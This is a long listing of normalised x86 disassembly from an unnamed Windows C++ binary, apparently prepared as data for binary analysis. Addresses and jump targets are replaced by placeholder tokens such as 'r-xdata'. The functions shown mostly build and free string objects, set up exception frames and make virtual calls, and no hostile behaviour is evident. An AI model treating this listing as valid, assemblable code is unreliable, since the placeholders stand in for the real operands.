mov [ ebp + 0x68 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x58 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x68 ] eax
mov [ ebp - 0x4 ] 0xb
cmp eax ebx
je r-xdata
test [ ebp + 0x5c ] 0x8
je r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
or [ ebp + 0x5c ] 0x4
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push 0x8
pop eax
mov [ ebp - 0x4 ] eax
or [ ebp + 0x5c ] eax
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp + 0x38 ]
push eax
push [ ebp + 0x68 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
mov eax [ ebp + 0x58 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x68 ] eax
mov [ ebp - 0x4 ] 0x10
cmp eax ebx
je r-xdata
test [ ebp + 0x5c ] 0x20
je r-xdata
push esi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xc
or [ ebp + 0x5c ] 0x10
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
lea eax [ ebp + 0x38 ]
push eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xd
or [ ebp + 0x5c ] 0x20
push eax
push [ ebp + 0x68 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x5c ] 0x4
je r-xdata
and [ ebp + 0x5c ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
mov ecx [ ebp + 0x58 ]
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x68 ] eax
mov [ ebp - 0x4 ] 0x15
cmp eax ebx
je r-xdata
test [ ebp + 0x5c ] 0x80
je r-xdata
push esi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x11
or [ ebp + 0x5c ] 0x40
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
lea eax [ ebp + 0x38 ]
push eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x12
or [ ebp + 0x5c ] 0x80
push eax
push [ ebp + 0x68 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x5c ] 0x10
je r-xdata
and [ ebp + 0x5c ] 0xffffffdf
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
and [ ebp + 0x5c ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
test [ ebp + 0x5c ] 0x200
je r-xdata
push esi
lea ecx [ ebp - 0x60 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x16
or [ ebp + 0x5c ] 0x100
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x17
or [ ebp + 0x5c ] 0x200
push eax
push [ ebp + 0x68 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x5c ] 0x40
je r-xdata
and [ ebp + 0x5c ] 0xffffff7f
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
and [ ebp + 0x5c ] 0xffffffef
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
test [ ebp + 0x5c ] 0x100
je r-xdata
and [ ebp + 0x5c ] 0xfffffdff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
and [ ebp + 0x5c ] 0xffffffbf
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
call sub_40415f
sub_416723
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
test eax eax
je r-xdata
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
push esi
call sub_416fb2
mov [ esi + 0x4 ] edi
pop edi
pop esi
retn 0x4
push esi
call sub_416f38
sub_41674a
push 0x4
mov eax sub_43be7d
call sub_425dad
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
mov [ ebx ] r--data
call sub_405144
xor edi edi
mov [ ebp - 0x4 ] edi
lea esi [ ebx + 0xb4 ]
push 0x4
mov [ ebx + 0xb0 ] edi
mov [ ebp + 0xc ] esi
call sub_4246c6
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_425e4c
retn 0x10
push ebx
mov edi eax
call sub_40d9dd
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x1
call sub_4093ba
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] edi
lea esi [ ebx + 0xd0 ]
call sub_403dae
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0xec ] eax
mov al [ ebp + 0x10 ]
mov [ ebx + 0xf0 ] al
mov eax [ ebx + 0x4 ]
mov [ ebx + 0xf1 ] 0x0
cmp eax edi
je r-xdata
sub_416802
push 0xc
mov eax sub_43a70c
call sub_425dad
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x2
lea edi [ ebx + 0xb4 ]
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov ecx [ edi ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebx + 0xd0 ]
call sub_40415f
mov esi edi
call sub_40f06d
lea esi [ ebx + 0x8 ]
call sub_4011ad
call sub_425e4c
retn
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ ebp - 0x18 ] 0x0
mov esi [ edi + 0x14 ]
mov eax [ edi ]
je r-xdata
sub_41688f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43f486
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ esp + 0x18 ] esi
cmp [ edi + 0xf0 ] 0x0
je r-xdata
lea eax [ edi + 0xf1 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
lea ecx [ edi + 0x94 ]
add eax 0x70
call sub_40561a
test al al
je r-xdata
mov eax [ edi + 0xc8 ]
mov eax [ eax ]
mov ecx [ edi + 0xb4 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
mov [ eax ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
push eax
lea ecx [ edi + 0x8 ]
call sub_41483b
call sub_423d5c
cmp [ esp + 0x1c ] eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
push 0xffffffff
push esi
push eax
lea ecx [ edi + 0xd0 ]
lea eax [ esp + 0x5c ]
push eax
push [ edi + 0x4 ]
call sub_40d136
push eax
lea eax [ esp + 0x44 ]
push r--data
push eax
mov [ esp + 0xac ] esi
call sub_40f984
add esp 0xc
push 0xffffffff
push 0x0
lea esi [ edi + 0xd0 ]
push eax
mov ecx esi
mov [ esp + 0xac ] 0x1
call sub_40400a
push 0x0
push 0x1
lea ecx [ esp + 0x48 ]
call sub_40415f
or [ esp + 0xa0 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x64 ]
call sub_40415f
push 0xffffffff
push 0x0
push esi
lea ecx [ ebx + 0x2b8 ]
jmp r-xdata
cmp [ edi + 0xb0 ] 0x0
je r-xdata
lea esi [ esp + 0x1c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push ebx
call [ eax + 0xc ]
call sub_408d54
jmp r-xdata
cmp [ esp + 0x20 ] esi
je r-xdata
call sub_40400a
mov [ esp + 0x17 ] 0x0
push r--data
lea ecx [ esp + 0x28 ]
call sub_403dc1
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ esp + 0x20 ] 0x1
call [ eax + 0x88 ]
cmp [ eax + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x3
mov [ esp + 0x17 ] 0x1
jne r-xdata
cmp [ esp + 0x1c ] 0x0
mov esi [ edi + 0xc8 ]
mov eax [ edi + 0xb4 ]
je r-xdata
or [ esp + 0xa0 ] 0xffffffff
test [ esp + 0x18 ] 0x1
je r-xdata
and [ esp + 0x18 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ esp + 0x80 ]
call sub_40415f
test [ esp + 0x18 ] 0x2
je r-xdata
cmp [ esp + 0x17 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x2c ]
call sub_40415f
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0xb0 ]
mov eax [ ecx ]
push edi
push ebx
call [ eax + 0x4 ]
sub_416ab4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43f436
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x20 ] esi
xor edi edi
mov [ esp + 0x14 ] edi
cmp [ esi + 0xf1 ] 0x0
jne r-xdata
xor ebx ebx
inc ebx
lea eax [ esp + 0x5c ]
push eax
push [ esi + 0x4 ]
call sub_40d136
push eax
lea eax [ esp + 0x7c ]
push r--data
push eax
mov [ esp + 0xac ] edi
call sub_40f984
add esp 0xc
push 0xffffffff
xor ebx ebx
push edi
inc ebx
push eax
lea ecx [ esi + 0xd0 ]
mov [ esp + 0xac ] bl
call sub_40400a
push edi
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
or [ esp + 0xa0 ] 0xffffffff
push edi
push ebx
lea ecx [ esp + 0x64 ]
call sub_40415f
mov [ esi + 0xf1 ] bl
jmp r-xdata
test [ esp + 0x14 ] 0x2
je r-xdata
push r--data
lea ecx [ esp + 0x44 ]
call sub_403dc1
mov [ esp + 0xa0 ] 0x3
push r--data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] ebx
call sub_403dc1
push edi
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x2c ]
mov [ esp + 0xa8 ] 0x4
push eax
push [ esp + 0x24 ]
mov [ esp + 0x24 ] 0x3
call sub_41ec78
mov edi eax
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xa0 ] 0x2
cmp eax edi
je r-xdata
or [ esp + 0xa0 ] 0xffffffff
test [ esp + 0x14 ] bl
je r-xdata
and [ esp + 0x14 ] 0xfffffffd
push 0x0
push ebx
lea ecx [ esp + 0x2c ]
call sub_40415f
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
push r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0xa4 ] 0x7
call sub_403dc1
lea ecx [ esp + 0x78 ]
push ecx
lea ecx [ esp + 0x60 ]
mov [ esp + 0xa4 ] 0x8
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push 0x0
push ebx
lea ecx [ esp + 0x64 ]
call sub_40415f
or [ esp + 0xa0 ] 0xffffffff
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xa0 ] 0x9
test eax eax
je r-xdata
and [ esp + 0x14 ] 0xfffffffe
push 0x0
push ebx
lea ecx [ esp + 0x48 ]
call sub_40415f
or [ esp + 0xa0 ] 0xffffffff
test [ esp + 0x14 ] 0x4
je r-xdata
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
push [ ebp + 0x8 ]
lea eax [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0xa
or [ esp + 0x18 ] 0x4
push eax
push [ esp + 0x20 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
inc ebx
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xfffffffb
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
mov [ esp + 0xa0 ] 0xf
mov eax [ esi + 0x4 ]
call sub_4049ca
mov edx [ edi ]
add eax 0x8c
push eax
lea eax [ esp + 0x7c ]
push eax
mov ecx edi
call [ edx + 0x10 ]
or [ esp + 0xa0 ] 0xffffffff
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
lea ecx [ esi + 0x94 ]
push ecx
lea ecx [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0x10
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
or [ esp + 0xa0 ] 0xffffffff
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
lea eax [ esp + 0x5c ]
push eax
mov [ esp + 0xa4 ] 0x11
push [ esi + 0x4 ]
call sub_40d136
push eax
lea eax [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0x12
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x10 ]
push 0x0
push ebx
lea ecx [ esp + 0x64 ]
call sub_40415f
or [ esp + 0xa0 ] 0xffffffff
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xa0 ] 0x13
test eax eax
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xa0 ] 0xc
test eax eax
je r-xdata
or [ esp + 0xa0 ] 0xffffffff
test [ esp + 0x14 ] 0x10
je r-xdata
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
lea eax [ esi + 0xd0 ]
push eax
lea eax [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0x14
or [ esp + 0x18 ] 0x10
push eax
push [ esp + 0x20 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
inc ebx
or [ esp + 0xa0 ] 0xffffffff
test [ esp + 0x14 ] 0x8
je r-xdata
push r--data
lea ecx [ esp + 0x7c ]
call sub_403dc1
push [ ebp + 0xc ]
lea eax [ esp + 0x7c ]
mov [ esp + 0xa4 ] 0xd
or [ esp + 0x18 ] 0x8
push eax
push [ esp + 0x20 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
inc ebx
mov eax [ esi + 0xc8 ]
mov eax [ eax ]
mov ecx [ esi + 0xb4 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] eax
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
and [ esp + 0x14 ] 0xfffffff7
push 0x0
push ebx
lea ecx [ esp + 0x80 ]
call sub_40415f
call sub_423d5c
cmp [ esp + 0x18 ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
push edi
call [ eax + 0x14 ]
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push edi
call [ eax + 0x8 ]
call sub_408d54
mov esi [ esp + 0x20 ]
jmp r-xdata
cmp [ esp + 0x1c ] ebx
je r-xdata
cmp [ esp + 0x18 ] 0x0
mov ebx [ esi + 0xc8 ]
mov eax [ esi + 0xb4 ]
je r-xdata
sub_416f38
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov esi [ edi + 0xc8 ]
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ edi + 0xcc ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0xcc ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
call sub_425e4c
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_416ff0
push esi
push 0x18
call sub_4246c6
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
push esi
call [ InitializeCriticalSection@IAT ]
jmp r-xdata
mov [ edi ] esi
mov eax edi
pop esi
retn
sub_417027
push 0x4
mov eax sub_43be33
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
call sub_403dae
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax edi
call sub_425e4c
retn 0x8
mov eax rw-data
mov esi edi
call sub_40d9a7
sub_41708b
push 0x4
mov eax sub_43be05
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
call sub_40415f
mov [ esi ] r--data
call sub_425e4c
retn
push eax
mov eax rw-data
call sub_40d9c4
mov eax [ esi + 0x4 ]
push esi
call sub_40d922
sub_4170dc
push 0xb8
mov eax sub_43f2ff
call sub_425e16
mov eax [ ebp + 0x8 ]
push 0xffffffff
xor ebx ebx
mov esi ecx
push ebx
push eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x30 ] ebx
call sub_40400a
lea eax [ ebp - 0x2c ]
push eax
push [ esi + 0x4 ]
call sub_40d136
push 0x80
mov [ ebp - 0x4 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp - 0x34 ] ebx
mov edi ebx
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x30 ] 0x1
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
push ebx
lea eax [ ebp - 0xc4 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
push [ ebp - 0x34 ]
call sub_41ec78
mov edi eax
mov [ ebp - 0x34 ] edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0xa8 ]
call sub_40415f
test [ ebp - 0x30 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x4 ]
call sub_4049ca
mov edx [ edi ]
add eax 0x38
push eax
lea eax [ ebp - 0x54 ]
push eax
mov ecx edi
call [ edx + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
lea ecx [ ebp - 0x8c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
lea ecx [ ebp - 0x8c ]
push ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x9
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0xa
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_40415f
xor edi edi
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x30 ] 0x4
push r--data
lea ecx [ ebp - 0x8c ]
call sub_403dc1
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0xc
or [ ebp - 0x30 ] 0x8
push eax
push [ ebp - 0x38 ]
xor bl bl
call sub_41ed6b
mov edi eax
xor ebx ebx
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x4
je r-xdata
and [ ebp - 0x30 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0x8c ]
call sub_40415f
test [ ebp - 0x30 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x70 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0xf
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x10
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_40415f
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x10
je r-xdata
push r--data
lea ecx [ ebp - 0x70 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x11
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
or [ ebp - 0x30 ] 0x10
call [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x38 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x2c ]
call sub_40d8fc
mov esi [ esi + 0x4 ]
push [ ebp - 0x34 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
call sub_425e60
retn 0x4
push ebx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_40415f
sub_4173ad
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43ffdb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x448
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x440 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x458 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
xor ebx ebx
mov [ esp + 0x10 ] ebx
mov eax [ esi ]
mov ecx esi
mov [ esp + 0x18 ] edi
mov [ esp + 0x20 ] esi
call [ eax + 0x68 ]
cmp eax 0x4
je r-xdata
mov eax [ ebp + 0xc ]
sub eax ebx
je r-xdata
cmp eax 0x8
jne r-xdata
lea eax [ esp + 0x3c8 ]
push eax
mov eax edi
push [ eax + 0x4 ]
call sub_40d136
push 0x80
mov [ esp + 0x464 ] 0x10
call sub_4246c6
pop ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x460 ] 0x11
mov esi r--data
cmp eax ebx
je r-xdata
dec eax
jne r-xdata
xor al al
mov ecx [ esp + 0x458 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x440 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov [ eax + 0x237 ] bl
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
push 0x10
call [ eax + 0x18 ]
push r--data
lea ecx [ esp + 0x378 ]
call sub_403dc1
lea ecx [ esp + 0x374 ]
mov [ esp + 0x460 ] ebx
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ esp + 0x460 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x37c ]
mov edi eax
call sub_40415f
cmp edi ebx
je r-xdata
mov [ esp + 0x24 ] ebx
mov edi ebx
push esi
lea ecx [ esp + 0x68 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x12
push r--data
lea ecx [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x8000
call sub_403dc1
push ebx
lea eax [ esp + 0x68 ]
push eax
lea eax [ esp + 0x50 ]
mov [ esp + 0x468 ] 0x13
push eax
push [ esp + 0x30 ]
mov [ esp + 0x20 ] 0x18000
call sub_41ec78
mov edi eax
mov [ esp + 0x24 ] edi
jmp r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x237 ] 0x1
mov eax [ edi + 0x4 ]
call sub_4089a2
jmp r-xdata
mov esi r--data
push esi
lea ecx [ esp + 0xf4 ]
call sub_403dc1
xor eax eax
inc eax
mov [ esp + 0x460 ] eax
push esi
lea ecx [ esp + 0x324 ]
mov [ esp + 0x14 ] eax
call sub_403dc1
push 0x3
pop ebx
mov [ esp + 0x460 ] 0x2
push r--data
lea ecx [ esp + 0xbc ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
push 0x7
mov [ esp + 0x464 ] ebx
mov eax [ edi ]
pop ebx
lea ecx [ esp + 0xf0 ]
push ecx
lea ecx [ esp + 0x324 ]
push ecx
lea ecx [ esp + 0xc0 ]
push ecx
mov ecx edi
mov [ esp + 0x1c ] ebx
call [ eax + 0x50 ]
test al al
jne r-xdata
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] 0x8000
je r-xdata
and [ esp + 0x10 ] 0xfffeffff
push ebx
push 0x1
lea ecx [ esp + 0x50 ]
call sub_40415f
test [ esp + 0x10 ] 0x10000
je r-xdata
mov [ esp + 0x17 ] 0x1
push r--data
lea ecx [ esp + 0x244 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x4
push r--data
lea ecx [ esp + 0x84 ]
mov [ esp + 0x14 ] 0xf
call sub_403dc1
push 0x1f
pop ebx
lea ecx [ esp + 0x240 ]
push ecx
lea ecx [ esp + 0x84 ]
mov [ esp + 0x464 ] 0x5
mov eax [ edi ]
push ecx
mov ecx edi
mov [ esp + 0x18 ] ebx
call [ eax + 0x44 ]
mov [ esp + 0x17 ] 0x0
test al al
je r-xdata
push r--data
lea ecx [ esp + 0xa0 ]
call sub_403dc1
lea ecx [ esp + 0x3c8 ]
push ecx
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x464 ] 0x16
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x468 ] 0x10
call sub_40415f
push r--data
lea ecx [ esp + 0x110 ]
call sub_403dc1
push r--data
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x464 ] 0x17
call sub_403dc1
lea ecx [ esp + 0x10c ]
push ecx
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x464 ] 0x18
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0xdc ]
call sub_40415f
push ebx
push 0x1
lea ecx [ esp + 0x114 ]
mov [ esp + 0x468 ] 0x10
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x460 ] 0x19
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xffff7fff
push ebx
push 0x1
lea ecx [ esp + 0x6c ]
call sub_40415f
test bl 0x8
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x88 ]
and ebx 0xffffffef
call sub_40415f
test bl 0x10
je r-xdata
mov [ esp + 0x1c ] ebx
push esi
lea ecx [ esp + 0x180 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x1a
or [ esp + 0x10 ] 0x20000
push r--data
lea ecx [ esp + 0x148 ]
call sub_403dc1
lea eax [ esp + 0x17c ]
push eax
lea eax [ esp + 0x148 ]
mov [ esp + 0x464 ] 0x1b
or [ esp + 0x14 ] 0x40000
push eax
